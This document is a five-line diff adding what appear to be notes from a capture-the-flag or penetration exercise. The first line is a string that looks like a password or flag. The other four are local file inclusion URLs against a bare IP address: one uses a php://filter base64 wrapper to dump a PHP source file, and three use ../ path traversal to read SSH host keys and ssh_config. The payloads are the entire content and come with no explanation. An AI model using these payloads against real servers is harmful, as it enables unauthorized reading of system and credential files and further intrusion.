@@ -1,0 +1,5 @@
+r00tc00k13
+http://34.91.129.225/?file=php://filter/convert.base64-encode/resource=attack.php
+view-source:http://34.91.129.225/?file=../../../../../../etc/ssh/ssh_host_ecdsa_key.pub
+view-source:http://34.91.129.225/?file=../../../../../../etc/ssh/ssh_host_rsa_key.pub
+view-source:http://34.91.129.225/?file=../../../../../../etc/ssh/ssh_config
